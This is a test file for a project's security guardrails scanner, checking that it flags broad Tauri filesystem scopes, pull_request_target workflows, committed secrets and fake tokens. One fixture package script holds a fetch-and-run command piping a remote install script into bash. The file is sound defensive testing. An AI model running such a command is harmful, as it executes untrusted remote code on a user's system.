import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'

import {
  collectSecurityFindings,
  splitFindingsByBaseline
} from '../../../../../../build/scripts/security-guardrails-core.mjs'

const writeJson = (root, relativePath, value) => {
  const absolutePath = path.join(root, relativePath)
  fs.mkdirSync(path.dirname(absolutePath), { recursive: true })
  fs.writeFileSync(absolutePath, `${JSON.stringify(value, null, 2)}\n`)
}

const writeText = (root, relativePath, value) => {
  const absolutePath = path.join(root, relativePath)
  fs.mkdirSync(path.dirname(absolutePath), { recursive: true })
  fs.writeFileSync(absolutePath, value)
}

const withFixture = (callback) => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'elephantnote-security-'))
  try {
    writeJson(root, 'package.json', { scripts: { test: 'vitest run' } })
    return callback(root)
  } finally {
    fs.rmSync(root, { recursive: true, force: true })
  }
}

const privateKeyFixture = [
  ['-----BEGIN ', 'PRIVATE KEY', '-----'].join(''),
  'secret',
  ['-----END ', 'PRIVATE KEY', '-----'].join('')
].join('\n')

const githubTokenFixture = ['ghp_', '0123456789abcdefghijklmnop'].join('')
const openAiCompatibleTokenFixture = ['sk-', '0123456789abcdefghijklmnopqrstuv'].join('')

describe('security guardrails', () => {
  it('flags broad Tauri filesystem scopes', () =>
    withFixture((root) => {
      writeJson(root, 'Elephant/backend/tauri/capabilities/default.json', {
        identifier: 'default',
        windows: ['main'],
        permissions: [
          'core:default',
          {
            identifier: 'fs:scope',
            allow: [{ path: '$HOME/**/*' }]
          }
        ]
      })

      const findings = collectSecurityFindings(root)

      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            id: 'TAURI_FS_SCOPE_BROAD',
            file: 'Elephant/backend/tauri/capabilities/default.json',
            value: '$HOME/**/*'
          })
        ])
      )
    }))

  it('keeps accepted debt visible while failing new unbaselined findings', () =>
    withFixture((root) => {
      writeJson(root, 'Elephant/backend/tauri/capabilities/default.json', {
        identifier: 'default',
        windows: ['main'],
        permissions: [
          {
            identifier: 'fs:scope',
            allow: [{ path: '$HOME/**/*' }, { path: '$DOCUMENT/**/*' }]
          }
        ]
      })

      const findings = collectSecurityFindings(root)
      const split = splitFindingsByBaseline(findings, {
        acceptedFindings: [
          {
            id: 'TAURI_FS_SCOPE_BROAD',
            file: 'Elephant/backend/tauri/capabilities/default.json',
            value: '$HOME/**/*'
          }
        ]
      })

      expect(split.acceptedFindings).toEqual(
        expect.arrayContaining([expect.objectContaining({ value: '$HOME/**/*' })])
      )
      expect(split.newFindings).toEqual(
        expect.arrayContaining([expect.objectContaining({ value: '$DOCUMENT/**/*' })])
      )
    }))

  it('rejects pull_request_target workflows', () =>
    withFixture((root) => {
      writeText(
        root,
        '.github/workflows/unsafe.yml',
        `name: unsafe\non:\n  pull_request_target:\npermissions:\n  contents: read\n`
      )

      const findings = collectSecurityFindings(root)

      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            id: 'GITHUB_ACTIONS_PULL_REQUEST_TARGET',
            file: '.github/workflows/unsafe.yml',
            value: 'pull_request_target'
          })
        ])
      )
    }))

  it('rejects package scripts that pipe remote content into a shell', () =>
    withFixture((root) => {
      writeJson(root, 'package.json', {
        scripts: {
          installTool: 'curl https://example.invalid/install.sh | bash'
        }
      })

      const findings = collectSecurityFindings(root)

      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            id: 'PACKAGE_SCRIPT_REMOTE_PIPE_TO_SHELL',
            file: 'package.json'
          })
        ])
      )
    }))

  it('rejects committed real environment files while allowing examples', () =>
    withFixture((root) => {
      writeText(root, '.env.local', 'OPENROUTER_API_KEY=do-not-commit\n')
      writeText(root, '.env.example', 'OPENROUTER_API_KEY=replace-me\n')

      const findings = collectSecurityFindings(root)

      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            id: 'SECRET_ENV_FILE_COMMITTED',
            file: '.env.local',
            value: '.env.local'
          })
        ])
      )
      expect(findings).not.toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            id: 'SECRET_ENV_FILE_COMMITTED',
            file: '.env.example'
          })
        ])
      )
    }))

  it('rejects private key material in committed files', () =>
    withFixture((root) => {
      writeText(root, 'fixtures/bad-key.txt', `${privateKeyFixture}\n`)

      const findings = collectSecurityFindings(root)

      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            id: 'SECRET_PRIVATE_KEY_CONTENT',
            file: 'fixtures/bad-key.txt'
          })
        ])
      )
    }))

  it('rejects GitHub and OpenAI-compatible tokens in source files', () =>
    withFixture((root) => {
      writeText(
        root,
        'src/bad.js',
        `
      const github = '${githubTokenFixture}'
      const llm = '${openAiCompatibleTokenFixture}'
    `
      )

      const findings = collectSecurityFindings(root)

      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ id: 'SECRET_GITHUB_TOKEN', file: 'src/bad.js' }),
          expect.objectContaining({ id: 'SECRET_OPENAI_COMPATIBLE_TOKEN', file: 'src/bad.js' })
        ])
      )
    }))
})
